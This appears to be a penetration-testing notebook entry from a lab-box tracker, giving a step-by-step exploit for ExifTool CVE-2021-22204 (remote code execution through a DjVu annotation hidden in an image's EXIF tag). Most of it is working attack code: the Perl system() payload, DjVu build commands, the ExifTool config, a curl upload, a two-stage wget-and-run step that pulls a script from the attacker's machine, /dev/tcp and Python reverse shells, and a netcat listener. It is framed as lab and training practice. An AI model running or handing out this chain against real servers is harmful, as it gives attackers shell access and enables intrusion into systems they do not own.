title: ExifTool RCE — CVE-2021-22204 via DjVu Metadata Injection
body:
If a web application processes uploaded images server-side using ExifTool versions 7.44 through 12.23, you can achieve remote code execution by uploading a crafted DjVu file disguised as a JPEG/PNG. ExifTool will parse the malicious metadata, hit a vulnerable Perl eval, and execute arbitrary commands as the user running the web server (typically www-data).

This is one of the most reliable web-to-shell chains on lab boxes because the surface — 'we accept user-uploaded images and run exiftool on them' — is everywhere. Photo galleries, file converters, thumbnail generators, anything that strips EXIF data or extracts image metadata. Found on PG Practice (Exghost), HTB, and OSCP-style boxes regularly.

— THE BUG IN ONE SENTENCE —

  ExifTool's DjVu annotation parser passes user-controlled metadata through
  Perl's eval() without proper sanitization, allowing arbitrary Perl code
  execution. Wrap your shell command in Perl's system() call, embed it in
  a DjVu annotation chunk, splice that chunk into a normal JPEG/PNG via
  ExifTool itself, and upload.

— FINGERPRINTING — IS THIS APPLICATION VULNERABLE? —

  Three signals to confirm exiftool processing:

  1. RESPONSE CONTAINS EXIFTOOL OUTPUT
     The server returns the parsed metadata in the response body — a clear
     'this is exiftool's output' formatted block:
        ExifTool Version Number  : 12.23
        File Name                : phpopnW14.jpg
        Directory                : /var/www/html/uploads
        ...
     If you see this format AND the version is <= 12.23, you're in.

  2. UPLOAD-AND-DISPLAY-METADATA WORKFLOW
     Even if the version isn't shown, an app that lets you upload an image
     and shows you the EXIF data afterward (camera, dimensions, GPS, etc.)
     is calling exiftool somewhere. Check the version with a known-clean
     PoC first to confirm.

  3. SOURCE CODE LEAK
     Sometimes a backup file (like Exghost's FTP backup) contains the PHP
     source — look for shell_exec/system/exec/passthru calls to exiftool
     binary. Confirms both the vulnerability and the exact command path.

  Vulnerable versions: 7.44 - 12.23 (patched in 12.24)
  Default Ubuntu 20.04 ships exiftool 11.88 — vulnerable.
  Default Ubuntu 22.04 ships exiftool 12.40 — patched.

— THE EXPLOITATION CHAIN — END TO END —

  Step-by-step (each step has full commands in the cmd block):

  1. Install build dependencies on Kali (djvulibre-bin)
  2. Write the Perl payload file
  3. Compress the payload with bzz
  4. Build the malicious DjVu file with djvumake
  5. Write the ExifTool config file (defines the HasselbladExif tag)
  6. Inject the DjVu payload into a clean image as a Hasselblad EXIF tag
  7. Upload the trojaned image to the target endpoint
  8. Verify RCE with ping (NEVER skip this step)
  9. Update payload to deliver reverse shell via wget + execute
  10. Re-build, re-upload, catch the shell

— THE TWO-STAGE PAYLOAD PATTERN — KEY INSIGHT —

  Naive approach (often fails): embed the full reverse shell directly:
     (metadata "\c${system('bash -c \"bash -i >& /dev/tcp/IP/443 0>&1\"')};")
  Problems: shell metacharacter quoting hell, length limits, escaping
  inside the DjVu annotation chunk.

  Two-stage approach (reliable): payload fetches and executes a script:
     Stage 1 (in metadata): wget my_server/shell -O /tmp/x; bash /tmp/x
     Stage 2 (on Kali HTTP server): the actual reverse shell script
  
  Why it works:
  - Stage 1 is short and uses no shell metacharacters
  - Stage 2 is plain bash, no escaping needed
  - You can iterate on Stage 2 without rebuilding the DjVu file

  This pattern applies to any file-upload-RCE where payload size or
  escaping is a constraint.

— ALWAYS TEST RCE WITH PING FIRST — DON'T SKIP THIS —

  Before going for a reverse shell, confirm code execution with ping:
     (metadata "\c${system('ping -c 3 KALI_IP')};")
  
  Then on Kali:
     sudo tcpdump icmp -i tun0
  
  If you see ICMP echo requests, RCE is confirmed and you have network
  reachability back to your Kali. If you don't:
  - Maybe RCE didn't fire (check exiftool version match)
  - Maybe target can't route to your tun0 (firewall, segmentation)
  - Maybe ICMP is blocked but TCP/UDP isn't (try wget instead)
  
  This catches the 'I have RCE but no shell coming back' problem in 30
  seconds instead of 30 minutes of debugging the wrong layer.

— FILE FORMAT NOTES — WHY DJVU? —

  The vulnerable code path is specifically in the DjVu annotation parser.
  But the uploaded file doesn't have to be a .djvu — exiftool reads
  metadata regardless of extension based on the magic bytes.
  
  Standard chain:
  - Build a .djvu file containing the Perl payload
  - Use exiftool itself to splice that DjVu data into a JPEG/PNG's
    HasselbladExif EXIF tag
  - Upload the JPEG/PNG
  - When the server runs exiftool on it, exiftool sees the embedded DjVu
    annotation and parses it, hitting the vulnerable code path
  
  This means YOU upload a real .jpg or .png. Server-side filters that
  check 'is this a real image' will pass — because it IS a real image,
  with bonus malicious EXIF.
cmd:
# ── INSTALL DEPENDENCIES ──────────────────────────────
sudo apt install djvulibre-bin
# Provides: bzz, djvumake, djvused, etc.
# exiftool should already be on Kali

# Set environment for the box
export ip=192.168.241.183
export KALI_IP=192.168.45.201
export BOXDIR=~/hacktrack/boxes/exiftool_$ip
mkdir -p $BOXDIR/exploits && cd $BOXDIR/exploits

# ── STEP 1: GRAB A SAMPLE IMAGE ──────────────────────
# Need any clean JPEG/PNG to splice the payload into
locate sample.png | head -3
cp /var/lib/inetsim/http/fakefiles/sample.png ./clean.png
# Or any image you have:
# cp ~/Pictures/anything.png ./clean.png

# ── STEP 2: WRITE THE PAYLOAD ────────────────────────
# Start with a PING test — confirm RCE before chasing shells
cat > payload <<EOF
(metadata "\c\${system('ping -c 3 $KALI_IP')};")
EOF

# Verify — should be exactly one line, with the literal \c and \${...}
cat payload
# Expected:
#   (metadata "\c${system('ping -c 3 192.168.45.201')};")

# ── STEP 3: COMPRESS THE PAYLOAD WITH BZZ ────────────
# DjVu uses bzz compression for annotation chunks
bzz payload payload.bzz
# Outputs: payload.bzz (binary blob, ~30-50 bytes)

# ── STEP 4: BUILD THE MALICIOUS DJVU FILE ────────────
# djvumake assembles a DjVu file from primitive chunks:
#   INFO  = image dimensions (we use 1x1, doesn't matter)
#   BGjp  = background JPEG layer (we use /dev/null = no background)
#   ANTz  = bzz-compressed annotation chunk (our payload)
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

# Verify it looks like a DjVu file
file exploit.djvu
# Expected: 'DjVu Multi-page document' or similar

# ── STEP 5: WRITE THE EXIFTOOL CONFIG FILE ────────────
# Defines a custom 'HasselbladExif' EXIF tag we can write to
# 0xc51b is the EXIF tag ID for HasselbladExif (real Hasselblad cameras
# use this tag for proprietary metadata)
cat > configfile <<'EOF'
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
    },
);
1;
EOF

# Why this works:
# - We write our DjVu data INTO a JPEG's HasselbladExif tag
# - The JPEG looks valid to file-type checks (it IS a JPEG)
# - When the server runs exiftool on the upload, exiftool reads ALL EXIF
#   tags including HasselbladExif, sees it contains a DjVu annotation,
#   and parses it — hitting the vulnerable code path

# ── STEP 6: SPLICE DJVU INTO THE CLEAN IMAGE ─────────
# Use exiftool itself to inject our malicious DjVu data
# into the HasselbladExif tag of the clean image
exiftool -config configfile '-HasselbladExif<=exploit.djvu' clean.png
# Expected output: '1 image files updated'
# Now clean.png is trojaned — same image, but with the DjVu payload
# embedded as a Hasselblad EXIF tag

# Verify the tag is now in the file:
exiftool -config configfile -HasselbladExif clean.png
# Should show binary data

# ── STEP 7: START NETWORK MONITORING (PING TEST) ─────
# In a separate terminal, watch for incoming ICMP
sudo tcpdump icmp -i tun0
# Leave this running

# ── STEP 8: UPLOAD AND TRIGGER ────────────────────────
# (Adjust path to match the actual upload endpoint you found)
curl -i -F name=test.png -F myFile=@clean.png http://$ip/exiftest.php
# Expected response: 'File uploaded successfully :)'
# Followed by exiftool output showing parsed metadata

# Watch the tcpdump terminal — within seconds you should see:
#   <target_ip>.<port> > <kali_ip>: ICMP echo request
# Three of them (we asked for -c 3)
# That's RCE confirmed.

# If no ping arrives:
#   - Re-check exiftool version on target (must be <= 12.23)
#   - Check tcpdump is on the right interface (tun0 for VPN)
#   - Try direct curl test of upload endpoint to confirm it accepts files

# ── STEP 9: BUILD THE REVERSE SHELL DELIVERY ──────────
# Now that RCE is confirmed, switch to a real shell

# Stage 2: write the reverse shell script
cat > shell <<EOF
#!/bin/bash
/bin/bash -i >& /dev/tcp/$KALI_IP/443 0>&1
EOF
# Or with python (less common):
#   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("KALI",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# Stage 1: update payload to wget + execute the script
cat > payload <<EOF
(metadata "\c\${system('wget $KALI_IP/shell -O /tmp/shell; bash /tmp/shell')};")
EOF

# Important: the FIRST attempt may need just the wget. Some servers
# kill the exiftool process before /tmp/shell finishes execution.
# If that happens, split into two uploads:
#   Upload 1: payload = (metadata "\c${system('wget IP/shell -O /tmp/shell; chmod +x /tmp/shell')};")
#   Upload 2: payload = (metadata "\c${system('/tmp/shell')};")

# Re-build the DjVu and re-splice into a fresh clean image
cp /var/lib/inetsim/http/fakefiles/sample.png ./clean.png
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
exiftool -config configfile '-HasselbladExif<=exploit.djvu' clean.png

# ── STEP 10: SET UP LISTENER + HTTP SERVER ────────────
# Terminal 1: catch the reverse shell
rlwrap -cAr nc -nlvp 443

# Terminal 2: serve the shell script
cd $BOXDIR/exploits
sudo python3 -m http.server 80
# Watch logs — you should see:
#   <target_ip> - - [date] "GET /shell HTTP/1.1" 200 -
# That's the target fetching your stage-2 payload

# Terminal 3: trigger
curl -i -F name=test.png -F myFile=@clean.png http://$ip/exiftest.php

# Within seconds, your nc listener should show:
#   connect to [<kali_ip>] from (UNKNOWN) [<target_ip>] <port>
#   www-data@target:/var/www/html/uploads$

# ── STEP 11: STABILIZE THE SHELL ──────────────────────
# Once you have www-data, immediately:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then Ctrl-Z, on Kali:
stty raw -echo; fg
# Press Enter twice, then on the target:
export TERM=xterm-256color
stty rows 50 cols 200

# ── BONUS: ONE-LINER VERSION (FOR FUTURE-YOU) ────────
# Once you've done this once and have configfile saved, the whole chain
# from a fresh image to a triggered shell is ~5 commands:
export ip=TARGET; export KALI_IP=YOUR_IP; export PORT=443
cp /var/lib/inetsim/http/fakefiles/sample.png clean.png
echo "(metadata \"\c\${system('wget $KALI_IP/shell -O /tmp/x; bash /tmp/x')};\")" > payload
bzz payload payload.bzz && djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
exiftool -config configfile '-HasselbladExif<=exploit.djvu' clean.png
echo '/bin/bash -i >& /dev/tcp/'$KALI_IP'/'$PORT' 0>&1' > shell
# Then in three terminals: nc listener, http.server, curl trigger

# ── TROUBLESHOOTING ───────────────────────────────────

# 'No file uploaded' / 200 OK with no metadata:
#   - Wrong field name in curl (-F myFile=@... — match the form's name attribute)
#   - File extension not accepted (try .jpg, .png, .gif)
#   - Auth required for upload endpoint

# 'Image uploaded' but no ping/shell:
#   - Check exiftool version in response — must be <=12.23
#   - Test ping from any other vector first (xp_dirtree from SQLi, etc.)
#   - Check Kali firewall: sudo ufw status
#   - VPN interface different from tun0? check with ip a

# 'Sorry, HasselbladExif is not writable':
#   - configfile not loaded — must specify -config configfile
#   - configfile syntax error — recheck the Perl code

# 'Nothing to do' from exiftool:
#   - Likely missing -config flag
#   - Or the exploit.djvu file is empty/corrupt — rebuild from scratch

# Reverse shell connects then immediately disconnects:
#   - Not a stable shell yet — this is normal
#   - Use the two-upload split (chmod first, execute second)
#   - Or upgrade to a python pty before doing anything else

# Server runs the upload but exiftool returns its OWN errors:
#   - The DjVu chunk is malformed — bzz/djvumake step likely failed
#   - Check `file exploit.djvu` outputs DjVu format
#   - Rebuild with: bzz payload payload.bzz && djvumake ...
warn:
ALWAYS TEST RCE WITH PING BEFORE CHASING SHELLS:
  Tcpdump on tun0 + ping in payload = 30-second test that tells you
  whether RCE works AND whether the target can route back. Skip this
  step and you'll spend 20 minutes wondering why your reverse shell
  isn't connecting (when actually the RCE never fired).

VERSION CHECK BEFORE COMMITTING TIME:
  CVE-2021-22204 is patched in exiftool 12.24+. Default Ubuntu 22.04
  has 12.40 — NOT VULNERABLE. Default Ubuntu 20.04 has 11.88 — vulnerable.
  If the upload response shows ExifTool Version Number > 12.23, this
  attack chain is dead. Pivot to other approaches (file overwrite, path
  traversal, second-order injection, etc.).

ESCAPING IS THE WHOLE GAME — USE TWO-STAGE:
  The payload format requires Perl's $... syntax inside a quoted Perl
  string inside a DjVu annotation. Three layers of escaping. Trying to
  inline a full reverse shell with bash special chars (>, &, |) into
  this is escape-hell. Use the two-stage pattern:
    Stage 1 (metadata): wget IP/file -O /tmp/x; bash /tmp/x
    Stage 2 (HTTP): the actual shell content
  Stage 1 has no special chars beyond ;, no quoting issues.

SPLIT WGET AND EXECUTE INTO TWO UPLOADS IF NEEDED:
  Sometimes the exiftool process is killed before /tmp/x finishes
  downloading and executing. Symptom: HTTP server shows the GET request,
  but no shell connects.
  Fix: split into two uploads:
    Upload 1 payload: 'wget IP/shell -O /tmp/x; chmod +x /tmp/x'
    Upload 2 payload: '/tmp/x'
  Each upload runs a separate exiftool process; the first finishes the
  download, the second runs it.

DON'T USE QUOTES INSIDE THE PERL STRING:
  The payload format is:
    (metadata "\c${system('cmd')};")
  Single quotes around 'cmd' are literal Perl syntax.
  If 'cmd' itself needs single quotes (e.g., a complex bash one-liner),
  you'll break the Perl parse. Use the two-stage pattern to avoid this.
  Or use Perl's qq{} or other quoting mechanisms — but two-stage is simpler.

UPLOAD DIRECTORY MAY NOT BE WEB-ACCESSIBLE:
  Some apps put uploads in /var/www/html/uploads (web-accessible) but
  others put them in /tmp or /var/storage (NOT web-accessible). The CVE
  doesn't care — the exec happens during exiftool processing, not on
  later access. So the upload directory is irrelevant to whether RCE
  triggers. But it matters if you wanted a webshell or persistence file.

LAB BOX HOSTNAME RESOLUTION QUIRK:
  Some lab boxes are deployed with multiple network interfaces or
  changing IPs. The Exghost writeup shows three different IPs across
  the engagement (192.168.223.183, 192.168.152.183, 192.168.241.183).
  The lab's IP can change between sessions. Always re-export $ip at
  the start of each session and re-test connectivity before assuming
  the same payload still works.

EXIFTOOL CONFIG FILE GETS RE-USED — SAVE IT:
  Once you write configfile correctly, save a copy somewhere permanent
  (~/scripts/exiftool_rce_configfile or in your notes). Every time you
  hit this CVE you'll need it again, and recreating it from memory takes
  longer than copying it.

KALI HTTP SERVER NEEDS PORT 80 (OR ROOT):
  python3 -m http.server 80 requires sudo. Either use sudo or use a
  non-privileged port (8080) and update the wget command in the payload
  to match: wget IP:8080/shell

DETECTION ON REAL ENGAGEMENTS:
  This attack leaves loud artifacts: a malformed JPEG with embedded DjVu,
  unusual EXIF tags (HasselbladExif on non-Hasselblad images), exiftool
  process spawning bash/wget child processes. Modern EDR catches it.
  Lab boxes don't have EDR. Plan accordingly for real engagements.

choices.label: Got www-data shell — stabilize and enumerate
Run linpeas to find privesc paths
pkexec found in SUID list — try PwnKit
Need to evaluate the public PoC before running
RCE confirmed but no shell — troubleshoot
